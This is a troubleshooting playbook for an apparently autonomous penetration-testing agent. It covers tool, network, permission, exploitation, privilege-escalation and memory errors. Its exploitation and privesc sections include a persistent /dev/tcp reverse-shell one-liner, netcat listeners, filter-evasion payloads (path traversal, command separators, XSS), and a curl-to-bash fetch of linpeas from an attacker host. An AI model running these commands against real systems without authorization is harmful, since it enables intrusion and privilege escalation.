# Error Recovery Playbook — When Things Go Wrong

> Don't panic. Don't repeat the same thing. Every error has a pattern.
> Find your error below, follow the fix.

---

## 🔴 TOOL CALL ERRORS

### "400 Bad Request" / "Invalid tool call"
**You formatted the tool call wrong.**
- Don't pass empty content — always include text or a tool call
- Check JSON syntax — missing quotes, commas, brackets
- Make sure required parameters are included

### "500 Internal Server Error"  
**The API/provider is broken, not you.**
- Wait 10 seconds and retry
- If it keeps happening, the model provider is down
- Try a different approach that doesn't need that specific call

### "Command not found"
**Tool isn't installed.**
- Install from Kali repos: `apt-get install -y TOOLNAME`
- Check alternatives in: `knowledge-base/tools/kali-essentials.md`
- Common substitutions:
  - No `gobuster` → use `dirb` or `ffuf`
  - No `feroxbuster` → use `gobuster` or `dirb`
  - No `sshpass` → use SSH with PTY or `expect`
  - No `nuclei` → use `nikto`
  - No `subfinder` → use `dig`, `host`, or `fierce`

---

## 🔴 NETWORK ERRORS

### "Connection refused"
**Service isn't running or wrong port.**
- Verify port is open: `nmap -p PORT TARGET`
- Service might have crashed — wait and retry
- You might need authentication first

### "Connection timed out"
**Firewall or target down.**
- Check if target is alive: `ping TARGET`
- Try `-Pn` flag with nmap
- Try from a different source port: `nmap --source-port 53 TARGET`
- Slow down your scan rate

### "Could not resolve host"
**DNS isn't configured for this hostname.**
- Add to /etc/hosts: `echo 'IP HOSTNAME' | sudo tee -a /etc/hosts`
- If no sudo: use the IP directly with `Host:` header
  - `curl -H "Host: HOSTNAME" http://IP/`
- Check if you're on the right VPN/network

### "No route to host"
**Network path doesn't exist.**
- Are you connected to the VPN? `ip addr show tun0`
- Check routing: `ip route`
- Target might be on a different subnet

---

## 🔴 PERMISSION ERRORS

### "Permission denied" (general)
**You don't have the right access level.**
- Are you the right user? `whoami`
- Check file permissions: `ls -la FILE`
- Try as different user if you have creds
- Look for alternative writable locations (/tmp, /dev/shm, /var/tmp)

### "sudo: a terminal is required" / "sudo: no password"
**Can't use sudo from this context.**
- If in a reverse shell: upgrade to full TTY first
  - `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- If in SSH without password: you simply don't have sudo
- Look for other privesc vectors (SUID, capabilities, kernel)

### "Operation not permitted" (kernel/mount)
**Kernel security is blocking you.**
- You might not be in the right namespace
- Try `unshare -rm` for user namespace tricks
- Some kernel exploits need specific conditions — check requirements

---

## 🔴 EXPLOITATION ERRORS

### "Exploit failed / no shell"
**Don't repeat — change approach.**
1. Try a DIFFERENT payload (not the same one again)
2. Try a different encoding (URL encode, base64, hex)
3. Try a different delivery method
4. Check if WAF/filter is blocking you
5. Read: `knowledge-base/checklists/reverse-shells.md` for alternatives
6. Last resort: try a completely different vulnerability

### "Shell dies immediately"
**Connection is being killed.**
- Use a more stable payload (not just `bash -i`)
- Try: `bash -c 'nohup bash -i >& /dev/tcp/IP/PORT 0>&1 &'`
- Use `rlwrap nc -nlvp PORT` on listener side
- Try different shell: `python3`, `perl`, `php` reverse shell
- Check if there's a process killer/cleanup script

### "Payload filtered / WAF detected"
**Input sanitization is blocking you.**
- URL encode the payload
- Double URL encode
- Use alternative syntax:
  - Instead of `;` try `|`, `||`, `&&`, backticks, `$()`
  - Instead of `/etc/passwd` try `....//....//etc/passwd`
  - Instead of `<script>` try `<img onerror=...>`
- Read: `knowledge-base/mitre-attack/techniques/defense-evasion-deep.md`

### "Reverse shell connects but no prompt"
**Shell is hanging.**
- Check your listener is correct: `nc -nlvp PORT`
- Try with `rlwrap`: `rlwrap nc -nlvp PORT`
- Send a command to test: `id`
- The shell might be non-interactive — upgrade it:
  - `python3 -c 'import pty;pty.spawn("/bin/bash")'`

---

## 🔴 PRIVILEGE ESCALATION ERRORS

### "Kernel exploit won't compile"
**Missing build tools on target.**
- Check: `which gcc make`
- If missing: compile on YOUR machine, then transfer
- Transfer methods:
  - `python3 -m http.server 8080` on your box → `wget` on target
  - `scp file user@TARGET:/tmp/`
  - Base64 encode → paste → decode on target

### "Kernel exploit compiles but fails"
**Wrong exploit for this kernel.**
- Double check kernel version: `uname -r`
- Check OS: `cat /etc/os-release`
- Some exploits are Ubuntu-specific, some are Debian-specific
- Try a different exploit for the same CVE
- Check exploit prerequisites (is the vulnerable module loaded?)

### "No obvious privesc vector"
**You need to dig deeper.**
- Run linpeas: `curl http://YOUR_IP:8080/linpeas.sh | bash`
- Check ALL of these:
  - `sudo -l`
  - `find / -perm -4000 2>/dev/null`
  - `getcap -r / 2>/dev/null`
  - `cat /etc/crontab`
  - `ls -la /var/mail/`
  - Writable files in PATH
  - Docker/LXD group membership
  - Internal services on localhost

---

## 🔴 CONTEXT / MEMORY ERRORS

### "I lost track of what I was doing"
**Check the state tracker.**
```bash
bash scripts/orchestrator.sh status      # Full engagement state
bash scripts/orchestrator.sh think       # What's next
bash scripts/tracker.sh status           # Legacy tracker
```

### "I don't remember the credentials I found"
**Check state files.**
```bash
cat state/orchestrator.json | python3 -m json.tool | grep -A2 creds
cat state/findings.log
```

### "I don't know what tools to use"
**Check context broker.**
```bash
bash scripts/context-broker.sh web       # Web tools
bash scripts/context-broker.sh network   # Network tools
bash scripts/context-broker.sh all       # Everything
```

---

## 🔴 GENERAL RULES FOR ERROR RECOVERY

1. **NEVER repeat the exact same action** — change something
2. **Read the error message** — it usually tells you what's wrong
3. **Try the simplest fix first** — don't overcomplicate
4. **After 3 failures, change approach entirely**
5. **Log errors** — `bash scripts/orchestrator.sh error "description"`
6. **Ask for help** if nothing works — don't waste cycles
